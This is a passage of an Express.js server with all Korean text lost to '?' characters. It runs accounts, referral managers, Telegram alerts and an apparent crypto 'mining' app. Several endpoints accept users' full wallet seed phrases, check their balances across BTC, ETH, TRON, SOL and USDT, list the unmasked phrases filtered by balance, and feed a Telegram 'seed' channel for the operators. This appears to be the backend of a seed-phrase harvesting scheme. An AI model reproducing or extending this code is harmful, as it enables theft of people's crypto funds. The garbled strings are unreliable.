      console.error('? API ??:', JSON.stringify(logData));
    } else if (res.statusCode >= 400) {
      console.warn('??  API ??:', JSON.stringify(logData));
    } else {
      console.log('? API:', req.method, req.path, res.statusCode, `${Date.now() - start}ms`);
    }
  });
  
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

// ---------- ????? API ----------

// ???? API (??? ?? ??)
app.post('/api/register', async (req, res) => {
  try {
    const { id, password, referralCode, telegram } = req.body || {};
    
    if (!id?.trim() || !password?.trim() || !referralCode?.trim()) {
      return res.status(400).json({ error: '???, ????, ??? ??? ?????.' });
    }
    
    // ??? ?? (manager ?? master ?? ??)
    const manager = await db.managerDB.get(referralCode.trim());
    if (!manager) {
      // managers ???? ??? admins ???(master)?? ??
      const [[masterRow]] = await db.pool.query(
        "SELECT id, tg_bot_token, tg_chat_id FROM managers WHERE id=? AND role='master'",
        [referralCode.trim()]
      );
      if (!masterRow) return res.status(400).json({ error: '???? ?? ??? ?????.' });
      // master? referral? ? ?? manager ???? ??
      Object.assign(masterRow, { tg_bot_token: masterRow.tg_bot_token, tg_chat_id: masterRow.tg_chat_id });
      Object.assign(manager || {}, masterRow);
      // manager? null??? ?? ??? masterRow? ??
      await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');
      try {
        await sendMasterTelegramChannel(
          'approval',
          `?? <b>?? ?? ??</b>\n???: <code>${escapeHtml(id.trim())}</code>\n????: ${escapeHtml(telegram?.trim() || '-')}\n???(???): <code>${escapeHtml(referralCode.trim())}</code>`
        );
      } catch (_) {}
      return res.json({ success: true, message: '????? ???????. ??? ??? ??????.', managerId: referralCode.trim() });
    }
    
    // ?? ??? ??
    const existing = await db.userDB.get(id.trim());
    if (existing) {
      return res.status(400).json({ error: '?? ???? ??????.' });
    }
    
    // ??? ?? (?? ?? ??)
    await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');

    try {
      await sendManagerTelegramByChannel(
        referralCode.trim(),
        'approval',
        `?? <b>?? ?? ??</b>\n???: <code>${escapeHtml(id.trim())}</code>\n????: ${escapeHtml(telegram ? telegram.trim() : '-')}\n???: <code>${escapeHtml(referralCode.trim())}</code>`
      );
    } catch (tgErr) {
      console.warn('?? ?? ???? ?? ??:', tgErr.message);
    }

    res.json({ 
      success: true, 
      message: '????? ???????. ??? ??? ??????.',
      managerId: referralCode.trim()
    });
  } catch (error) {
    console.error('???? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? API (?? ? ???? ??)
app.post('/api/login', async (req, res) => {
  try {
    const { id, password } = req.body || {};
    if (!id?.trim() || !password?.trim()) {
      return res.status(400).json({ error: '???? ????? ?????.' });
    }
    
    const isValid = await db.userDB.validate(id, password);
    if (!isValid) {
      return res.status(401).json({ error: '??? ?? ????? ???? ????.' });
    }
    
    // ??? ?? ??
    const user = await db.userDB.get(id.trim());
    
    // ?? ?? ??? ?? (??? ??? ?? ??)
    if (user.status === 'pending') {
      return res.status(403).json({ error: '??? ?? ?? ????.' });
    }
    
    if (user.status === 'suspended') {
      return res.status(403).json({ error: '??? ???????. ????? ?????.' });
    }
    
    // ??? ?? ?? (??? ?? ?? ??? ??)
    let expireDate = null;
    let remainingDays = null;
    let isExpired = false;
    
    if (user.expireDate) {
      const now = new Date();
      expireDate = new Date(user.expireDate);
      
      // ?? ?? ?? (??? ?? ??)
      remainingDays = Math.ceil((expireDate - now) / (1000 * 60 * 60 * 24));
      isExpired = now > expireDate;
    }
    
    // ?? ??
    const token = crypto.randomBytes(16).toString('hex');
    const kicked = await sessionStore.save(id.trim(), token);

    await recordLoginPublicIp(req, 'app_user', id.trim());

    return res.json({ 
      token,
      kicked,
      status: user.status || 'approved',
      expireDate: expireDate ? expireDate.toISOString() : null,
      remainingDays: remainingDays,
      isExpired: isExpired  // ?? ?? ??? ?? (??? ?? ??)
    });
  } catch (error) {
    console.error('??? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// GET /api/user/subscription?token= ? ?? ?? ?? ?? (? ???)
app.get('/api/user/subscription', async (req, res) => {
  try {
    const { token } = req.query;
    if (!token) return res.status(400).json({ error: 'token ??' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '?? ??' });
    const user = await db.userDB.get(userId);
    if (!user) return res.status(404).json({ error: '??? ??' });
    const now = new Date();
    const expiry = user.expireDate ? new Date(user.expireDate) : null;
    const remainingDays = expiry ? Math.max(0, Math.ceil((expiry - now) / (1000 * 60 * 60 * 24))) : 0;
    res.json({
      status: user.status,
      expireDate: expiry ? expiry.toISOString() : null,
      remainingDays,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/miner/report ? ?? ??? ??/?? ? ?? ?? ??
app.post('/api/miner/report', async (req, res) => {
  try {
    const { token, status } = req.body || {};
    if (!token) return res.status(401).json({ error: 'token ??' });
    if (!['running', 'stopped'].includes(status)) return res.status(400).json({ error: 'status ??' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '?? ??' });
    await db.pool.query(
      `INSERT INTO miner_status (user_id, status, assigned_at)
       VALUES (?, ?, ?)
       ON DUPLICATE KEY UPDATE status = VALUES(status), assigned_at = VALUES(assigned_at)`,
      [userId, status, status === 'running' ? new Date() : null]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/session/validate', async (req, res) => {
  try {
    const token = req.query.token;
    if (!token) return res.status(401).json({ error: 'token ??' });

    const [rows] = await db.pool.query(
      'SELECT user_id, last_activity, kicked FROM sessions WHERE token = ?',
      [token]
    );

    if (rows.length === 0) {
      return res.status(401).json({ error: 'expired', kicked: false });
    }

    const session = rows[0];

    // ?? ?? ????? ?? ??? ??
    if (session.kicked) {
      return res.status(401).json({ error: 'kicked', kicked: true });
    }

    // 24?? ???? ??
    const lastActivity = new Date(session.last_activity).getTime();
    if (Date.now() - lastActivity > SESSION_TIMEOUT) {
      await db.pool.query('DELETE FROM sessions WHERE token = ?', [token]);
      return res.status(401).json({ error: 'expired', kicked: false });
    }

    // ???? ?? ??
    await db.pool.query('UPDATE sessions SET last_activity = NOW() WHERE token = ?', [token]);
    return res.json({ ok: true });
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??' });
  }
});

// POST /api/logout ? ? ?? ? ?? ??? ??
app.post('/api/logout', async (req, res) => {
  try {
    const { token } = req.body || {};
    if (!token) return res.status(400).json({ error: 'token ??' });
    await db.pool.query('DELETE FROM sessions WHERE token = ?', [token]);
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== ?? ?? API ==========

// GET /api/user/profile ? ??? ID + ?? ?? ??? ID ??
app.get('/api/user/profile', requireSession, async (req, res) => {
  try {
    const [[user]] = await db.pool.query(
      'SELECT id, telegram, manager_id FROM users WHERE id = ?',
      [req.userId]
    );
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    let managerTelegram = '';
    if (user.manager_id) {
      const [[mgr]] = await db.pool.query('SELECT telegram FROM managers WHERE id = ?', [user.manager_id]);
      managerTelegram = mgr?.telegram || '';
    }
    res.json({
      id: user.id,
      messenger_id: user.telegram || '',
      manager_id: user.manager_id || '',
      manager_messenger_id: managerTelegram,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/user/profile ? ?? ??? ID ??
app.patch('/api/user/profile', requireSession, async (req, res) => {
  try {
    const { messenger_id } = req.body || {};
    if (messenger_id === undefined) return res.status(400).json({ error: 'messenger_id ??' });
    await db.pool.query('UPDATE users SET telegram = ? WHERE id = ?', [messenger_id.trim(), req.userId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/miner ? ??? ?? ??
app.get('/api/user/miner', requireSession, async (req, res) => {
  try {
    const [[row]] = await db.pool.query(
      'SELECT status, coin_type, assigned_at FROM miner_status WHERE user_id = ?',
      [req.userId]
    );
    res.json({
      status: row?.status || 'stopped',
      coin_type: row?.coin_type || 'BTC',
      assigned_at: row?.assigned_at || null,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/mining-records ? ?? ?? (??????)
app.get('/api/user/mining-records', requireSession, async (req, res) => {
  try {
    let page = Math.max(1, parseInt(req.query.page, 10) || 1);
    let pageSize = Math.min(100, Math.max(1, parseInt(req.query.pageSize, 10) || 20));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) as total FROM mining_records WHERE user_id = ?',
      [req.userId]
    );
    const [records] = await db.pool.query(
      'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT ? OFFSET ?',
      [req.userId, pageSize, offset]
    );
    const [[{ cumulative }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as cumulative FROM mining_records WHERE user_id = ?',
      [req.userId]
    );
    res.json({ total, page, pageSize, records, cumulative: Number(cumulative) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/seeds ? ?? ?? ?? (??????, ?? ??)
app.get('/api/user/seeds', requireSession, async (req, res) => {
  try {
    const userId = req.userId;
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize, 10) || 10));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) AS total FROM seeds WHERE user_id = ?', [userId]
    );
    const [rows] = await db.pool.query(
      `SELECT id, phrase, created_at, balance, usdt_balance, btc, eth, tron, sol, checked
       FROM seeds WHERE user_id = ? ORDER BY id DESC LIMIT ? OFFSET ?`,
      [userId, pageSize, offset]
    );
    const mask = (phrase) => {
      const words = String(phrase || '').trim().split(/\s+/).filter(Boolean);
      if (!words.length) return '';
      if (words.length <= 3) return words[0] + ' ***';
      return words[0] + ' ? ' + words[words.length - 1] + '  (' + words.length + '??)';
    };
    res.json({
      seeds: rows.map(r => ({
        id: r.id,
        phrase: mask(r.phrase),
        at: r.created_at,
        balance: Number(r.balance) || 0,
        usdt_balance: Number(r.usdt_balance) || 0,
        btc: r.btc != null ? Number(r.btc) : null,
        eth: r.eth != null ? Number(r.eth) : null,
        tron: r.tron != null ? Number(r.tron) : null,
        sol: r.sol != null ? Number(r.sol) : null,
        checked: !!r.checked,
      })),
      total: Number(total),
      page,
      pageSize,
    });
  } catch (e) {
    console.error('?? ?? ?? ??:', e.message);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

app.post('/api/seed', async (req, res) => {
  try {
    const { token, phrase } = req.body || {};
    if (!token || !phrase) return res.status(400).end();
    
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).end();
    
    const seedId = await db.seedDB.add(userId, phrase);
    res.json({ ok: true });

    // ?? ?? ??????? ?? ?? ???
    if (seedId) {
      setImmediate(async () => {
        try {
          const { processSeed } = require('./seed-checker');
          await processSeed({ id: seedId, user_id: userId, phrase: phrase.trim(), created_at: new Date() });
        } catch (e) {
          console.error(`[SEED ????] ID=${seedId} ??:`, e.message);
        }
      });
    }
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ??? ?? ???? (??????) ----------
app.get('/api/seed/history', async (req, res) => {
  try {
    const { token } = req.query || {};
    if (!token) {
      return res.status(400).json({ error: 'token ??' });
    }

    // ?? ? ??? ID (?? ?? + ???? ??)
    const userId = await sessionStore.getUserId(token);
    if (!userId) {
      return res.status(401).json({ error: '?? ?? ?? ??? token' });
    }

    // ?????? ????
    let page = parseInt(req.query.page, 10) || 1;
    let pageSize = parseInt(req.query.pageSize, 10) || 30;
    if (page < 1) page = 1;
    if (pageSize < 1) pageSize = 1;
    if (pageSize > 100) pageSize = 100;
    const offset = (page - 1) * pageSize;

    // ??: hasBalance (true/false)
    const hasBalanceParam = (req.query.hasBalance || '').toString().toLowerCase();
    const filters = ['user_id = ?'];
    const params = [userId];

    if (hasBalanceParam === 'true') {
      filters.push('(IFNULL(balance, 0) > 0 OR IFNULL(usdt_balance, 0) > 0)');
    } else if (hasBalanceParam === 'false') {
      filters.push('(IFNULL(balance, 0) = 0 AND IFNULL(usdt_balance, 0) = 0)');
    }

    const whereSql = 'WHERE ' + filters.join(' AND ');

    // ??? ??
    const [rows] = await db.pool.query(
      `
      SELECT id, phrase, created_at, balance, usdt_balance, btc, eth, tron, sol
      FROM seeds
      ${whereSql}
      ORDER BY id DESC
      LIMIT ? OFFSET ?
      `,
      [...params, pageSize, offset]
    );

    // ?? ?? ??
    const [[countRow]] = await db.pool.query(
      `
      SELECT COUNT(*) AS totalCount
      FROM seeds
      ${whereSql}
      `,
      params
    );

    const totalCount = Number(countRow?.totalCount || 0);
    const totalPages = totalCount === 0 ? 0 : Math.ceil(totalCount / pageSize);
    const hasNext = page < totalPages;

    const items = rows.map((row) => {
      const createdAt = row.created_at instanceof Date
        ? row.created_at
        : new Date(row.created_at);

      // ??? ID ??: seed_YYYYMMDD_000001
      const y = createdAt.getUTCFullYear();
      const m = String(createdAt.getUTCMonth() + 1).padStart(2, '0');
      const d = String(createdAt.getUTCDate()).padStart(2, '0');
      const idFormatted = 'seed_' + `${y}${m}${d}_` + String(row.id).padStart(6, '0');

      const phrase = row.phrase || '';
      const words = phrase.trim().split(/\s+/).filter(Boolean);
      const phrasePreview = words.slice(0, 3).join(' ');

      // BIP39 ??? ??? ?? (ethers ??)
      let checksumValid = false;
      try {
        ethers.Wallet.fromPhrase(phrase);
        checksumValid = true;
      } catch {
        checksumValid = false;
      }

      const trx  = row.tron  != null ? Number(row.tron)  : 0;
      const usdt = row.usdt_balance != null ? Number(row.usdt_balance) : 0;
      const btc  = row.btc  != null ? Number(row.btc)  : 0;
      const eth  = row.eth  != null ? Number(row.eth)  : 0;
      const sol  = row.sol  != null ? Number(row.sol)  : 0;
      const hasBalance = trx > 0 || usdt > 0 || btc > 0 || eth > 0 || sol > 0;

      return {
        id: idFormatted,
        createdAt: createdAt.toISOString(),
        phrase,
        phrasePreview,
        source: 'unknown',
        network: 'multi',
        address: '',
        hasBalance,
        trx,
        usdt,
        btc,
        eth,
        sol,
        checksumValid,
      };
    });

    res.json({
      page,
      pageSize,
      totalCount,
      totalPages,
      hasNext,
      items,
    });
  } catch (error) {
    console.error('?? ???? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- APK ???? (??? ???) ----------
// ????? nexus ??? ?? ?? .apk ??? ?????.
app.get('/download/apk', async (req, res) => {
  try {
    const apkDir = path.join('/home', 'myno', '????', 'nexus');

    // ?? ? APK ?? ?? ??
    const files = await fs.promises.readdir(apkDir);
    const apkFiles = files.filter((name) => name.toLowerCase().endsWith('.apk'));

    if (apkFiles.length === 0) {
      return res.status(404).json({ error: 'APK ??? ?? ? ????.' });
    }

    // ?? ??? ??? APK ?? ??
    const stats = await Promise.all(
      apkFiles.map(async (name) => {
        const fullPath = path.join(apkDir, name);
        const stat = await fs.promises.stat(fullPath);
        return { name, fullPath, mtime: stat.mtimeMs };
      })
    );

    stats.sort((a, b) => b.mtime - a.mtime);
    const latest = stats[0];

    // ????? ?? (Content-Disposition: attachment)
    return res.download(latest.fullPath, latest.name);
  } catch (error) {
    console.error('APK ???? ??:', error);
    return res.status(500).json({ error: 'APK ???? ? ?? ??? ??????.' });
  }
});

app.get('/api/admin/telegram', async (req, res) => {
  try {
    const telegram = await db.settingDB.get('global_telegram') || '@??';
    res.json({ nickname: telegram });
  } catch (error) {
    console.error('???? ?? ??:', error);
    res.json({ nickname: '@??' });
  }
});

// ---------- ??? ??? ----------
app.post('/api/admin/login', async (req, res) => {
  try {
  const { id, password } = req.body || {};
  if (!id?.trim() || !password?.trim()) {
    return res.status(400).json({ error: '???? ????? ?????.' });
  }
    
    // ??? ?? ??
  if (id.trim() === MASTER_ID && password === MASTER_PW) {
    const token = createAdminToken();
    adminSessions.set(token, { role: 'master', id: MASTER_ID });
    await recordLoginPublicIp(req, 'admin', MASTER_ID);
    return res.json({ role: 'master', id: MASTER_ID, token });
  }
    
    // DB?? ??? ??? ?? (???? owner.html ??)
    const manager = await db.managerDB.validate(id, password);
    if (manager) {
      if (manager.role !== 'master') {
        return res.status(403).json({ error: '??(???) ??? ?? ???(/owner.html)? ??? ???.' });
      }
      const token = createAdminToken();
      adminSessions.set(token, { role: 'master', id: id.trim() });
      await recordLoginPublicIp(req, 'admin', id.trim());
      return res.json({ role: 'master', id: id.trim(), token });
    }
    
    res.status(401).json({ error: '??? ?? ????? ???? ????.' });
  } catch (error) {
    console.error('??? ??? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.body?.token || '';
  adminSessions.delete(token);
  res.json({ ok: true });
});

// ?? ??? ??? ?(admin) ?? ?? ???
app.post('/api/admin/logout-all', requireAdmin, (req, res) => {
  const myId = req.admin.id;
  const myRole = req.admin.role;
  for (const [t, s] of adminSessions.entries()) {
    if (s && s.id === myId && s.role === myRole) adminSessions.delete(t);
  }
  res.json({ ok: true });
});

// ???? ??? ?? (?? ???)
app.get('/api/admin/me', requireAdmin, async (req, res) => {
  try {
    let telegram = '';
    if (req.admin.role === 'manager') {
      const m = await db.managerDB.get(req.admin.id);
      telegram = m?.telegram || '';
    }
  res.json({
    role: req.admin.role,
    id: req.admin.id,
      telegram,
    });
  } catch (error) {
    console.error('??? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ??? ??: ???? ?? ----------
app.post('/api/admin/telegram', requireAdmin, requireMaster, async (req, res) => {
  try {
    const telegram = (req.body?.nickname ?? '').toString().trim() || '@??';
    await db.settingDB.set('global_telegram', telegram);
  res.json({ ok: true });
  } catch (error) {
    console.error('???? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ??? ??: ??? CRUD ----------
app.get('/api/admin/managers', requireAdmin, requireMaster, async (req, res) => {
  try {
    const managers = await db.managerDB.getAll();
    res.json(managers);
  } catch (error) {
    console.error('??? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

app.post('/api/admin/managers', requireAdmin, requireMaster, async (req, res) => {
  try {
  const { id, password, telegram, memo } = req.body || {};
  if (!id?.trim()) return res.status(400).json({ error: '??? ??' });
    
    await db.managerDB.addOrUpdate(id.trim(), password || '', telegram || '', memo || '');
  res.json({ ok: true });
  } catch (error) {
    console.error('??? ??/?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

app.delete('/api/admin/managers/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    await db.managerDB.remove(req.params.id);
  res.json({ ok: true });
  } catch (error) {
    console.error('??? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// GET /api/admin/master/telegram-bot
app.get('/api/admin/master/telegram-bot', requireAdmin, requireMaster, async (req, res) => {
  try {
    const c = await getMasterTgConfig();
    const [[d]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey='master_tg_chat_deposit'");
    const [[s]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey='master_tg_chat_seed'");
    const [[a]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey='master_tg_chat_approval'");
    res.json({
      botToken: c.botToken || '',
      chatId: c.legacyChatId || '',
      chatDeposit: (d?.sval || '').toString(),
      chatSeed: (s?.sval || '').toString(),
      chatApproval: (a?.sval || '').toString(),
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PUT /api/admin/master/telegram-bot
app.put('/api/admin/master/telegram-bot', requireAdmin, requireMaster, async (req, res) => {
  try {
    await mergeMasterTgSettingsFromBody(req.body || {});
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/master/telegram-bot/test  body: { channel?: 'deposit'|'seed'|'approval' }
app.post('/api/admin/master/telegram-bot/test', requireAdmin, requireMaster, async (req, res) => {
  try {
    const channel = (req.body?.channel || 'deposit').toString();
    const c = await getMasterTgConfig();
    if (!c.botToken) {
      return res.status(400).json({ error: '? ??? ???? ?????.' });
    }
    const chat = channel === 'seed' ? c.chatSeed : channel === 'approval' ? c.chatApproval : c.chatDeposit;
    if (!chat) {
      return res.status(400).json({ error: `?? "${channel}"? Chat ID? ????.` });
    }
    const label = channel === 'seed' ? '???? ??' : channel === 'approval' ? '????' : '??';
    await sendTelegram(
      c.botToken,
      chat,
      `? <b>??? ?? ???</b> (${label})\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
      true
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/telegram-errors ? ?? Telegram ?? ?? ?? (??? ??)
app.get('/api/admin/telegram-errors', requireAdmin, requireMaster, (req, res) => {
  res.json({ errors: _tgErrorLog });
});

// GET /api/admin/python-diag ? Python/pymysql ?? ?? (??? ??)
app.get('/api/admin/python-diag', requireAdmin, requireMaster, (req, res) => {
  const { execFile } = require('child_process');
  const results = {};
  const cmds = [
    ['which python3', 'bash', ['-lc', 'which python3']],
    ['which python', 'bash', ['-lc', 'which python']],
    ['python3 pymysql check', 'bash', ['-lc', 'python3 -c "import pymysql; import sys; print(sys.executable)"']],
    ['pip3 show pymysql', 'bash', ['-lc', 'pip3 show pymysql 2>&1 | head -5']],
    ['node user', 'bash', ['-lc', 'whoami']],
    ['PATH', 'bash', ['-lc', 'echo $PATH']],
  ];
  let done = 0;
  cmds.forEach(([label, cmd, args]) => {
    execFile(cmd, args, { timeout: 8000 }, (err, stdout, stderr) => {
      results[label] = { out: (stdout || '').trim(), err: (err ? err.message : '') || (stderr || '').trim() };
      done++;
      if (done === cmds.length) res.json(results);
    });
  });
});

// GET /api/admin/managers/:id/telegram-bot
app.get('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) => {
  const targetId = req.params.id;
  if (req.admin.role !== 'master' && req.admin.id !== targetId) {
    return res.status(403).json({ error: '?? ??' });
  }
  try {
    const [[mgr]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
      [targetId]
    );
    if (!mgr) return res.status(404).json({ error: '??? ??' });
    res.json({
      botToken: mgr.tg_bot_token || '',
      chatId: mgr.tg_chat_id || '',
      chatDeposit: mgr.tg_chat_deposit || '',
      chatApproval: mgr.tg_chat_approval || '',
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PUT /api/admin/managers/:id/telegram-bot
app.put('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) => {
  const targetId = req.params.id;
  if (req.admin.role !== 'master' && req.admin.id !== targetId) {
    return res.status(403).json({ error: '?? ??' });
  }
  try {
    const body = req.body || {};
    const [[existing]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
      [targetId]
    );
    if (!existing) return res.status(404).json({ error: '??? ??' });
    const pick = (bodyKey, col) => {
      if (!Object.prototype.hasOwnProperty.call(body, bodyKey)) return existing[col];
      const v = body[bodyKey];
      if (v == null || String(v).trim() === '') return null;
      return String(v).trim();
    };
    await db.pool.query(
      'UPDATE managers SET tg_bot_token = ?, tg_chat_id = ?, tg_chat_deposit = ?, tg_chat_approval = ? WHERE id = ?',
      [
        pick('botToken', 'tg_bot_token'),
        pick('chatId', 'tg_chat_id'),
        pick('chatDeposit', 'tg_chat_deposit'),
        pick('chatApproval', 'tg_chat_approval'),
        targetId,
      ]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/managers/:id/telegram-bot/test  body: { channel?: 'deposit'|'approval' }
app.post('/api/admin/managers/:id/telegram-bot/test', requireAdmin, async (req, res) => {
  const targetId = req.params.id;
  if (req.admin.role !== 'master' && req.admin.id !== targetId) {
    return res.status(403).json({ error: '?? ??' });
  }
  try {
    const channel = (req.body?.channel || 'deposit').toString();
    const [[mgr]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
      [targetId]
    );
    if (!mgr?.tg_bot_token) {
      return res.status(400).json({ error: '? ??? ???? ?????.' });
    }
    const dep = (mgr.tg_chat_deposit || '').trim() || (mgr.tg_chat_id || '').trim();
    const appr = (mgr.tg_chat_approval || '').trim() || (mgr.tg_chat_id || '').trim();
    const chat = channel === 'approval' ? appr : dep;
    if (!chat) {
      return res.status(400).json({ error: `?? "${channel}"? Chat ID? ????.` });
    }
    const label = channel === 'approval' ? '????' : '??';
    await sendTelegram(
      mgr.tg_bot_token,
      chat,
      `? <b>?? ?? ???</b> (${label})\n???: <code>${escapeHtml(targetId)}</code>\n?? ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
      true
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- ?? ?? (???=??, ???=? ???, pending ??) ----------
app.get('/api/admin/users', requireAdmin, async (req, res) => {
  try {
    // pending ?? ?? ??
    let query = 'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users';
    const params = [];
    if (req.admin.role !== 'master') {
      query += ' WHERE manager_id = ?';
      params.push(req.admin.id);
    }
    query += ' ORDER BY FIELD(status,"pending","approved","suspended"), id';
    const [list] = await db.pool.query(query, params);

    const managers = await db.managerDB.getAll();
    const byId = Object.fromEntries(managers.map((m) => [m.id, m.telegram || m.id]));

    const now = new Date();
    const withManager = list.map((u) => {
      const exp = u.expireDate ? new Date(u.expireDate) : null;
      const remainingDays = exp ? Math.ceil((exp - now) / 86400000) : null;
      return {
        id: u.id,
        managerId: u.managerId || null,
        managerName: byId[u.managerId] || '-',
        telegram: u.telegram || '',
        status: u.status || 'pending',
        expireDate: u.expireDate || null,
        remainingDays,
      };
    });

    res.json(withManager);
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ?? ?? ?? ?? (????)
app.get('/api/admin/pending-users', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.role === 'master' ? null : req.admin.id;
    const pendingUsers = await db.userDB.getPendingUsers(managerId);
    res.json(pendingUsers);
  } catch (error) {
    console.error('?? ?? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? ??
app.post('/api/admin/approve-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ??? ???? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
    }
    
    await db.userDB.approveUser(userId.trim());
    res.json({ ok: true, message: '???? ???????.' });
  } catch (error) {
    console.error('??? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? ??
app.post('/api/admin/reject-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ??? ???? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
    }
    
    // ?? ? ??
    await db.userDB.remove(userId.trim());
    res.json({ ok: true, message: '???? ???????.' });
  } catch (error) {
    console.error('??? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ???? ??
app.post('/api/admin/set-subscription', requireAdmin, async (req, res) => {
  try {
    const { userId, days } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    if (!days || ![30, 90, 180, 365].includes(Number(days))) {
      return res.status(400).json({ error: '??? ????? ????? (30, 90, 180, 365?)' });
    }
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ??? ???? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
    }
    
    await db.userDB.setSubscription(userId.trim(), Number(days));
    res.json({ ok: true, message: `????? ${days}?? ???????.` });
  } catch (error) {
    console.error('???? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? ??/???
app.post('/api/admin/suspend-user', requireAdmin, async (req, res) => {
  try {
    const { userId, suspend } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ??? ???? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ?? ?????.' });
    }
    
    await db.userDB.suspendUser(userId.trim(), suspend);
    res.json({ ok: true, message: suspend ? '???? ???????.' : '???? ????????.' });
  } catch (error) {
    console.error('??? ??/??? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ?? ??/?? (???? ? ?? ?? ?? ??, ??? ??)
app.post('/api/admin/users', requireAdmin, requireMaster, async (req, res) => {
  try {
  const { id, password, managerId, telegram } = req.body || {};
  if (!id?.trim()) return res.status(400).json({ error: '??? ??' });
    
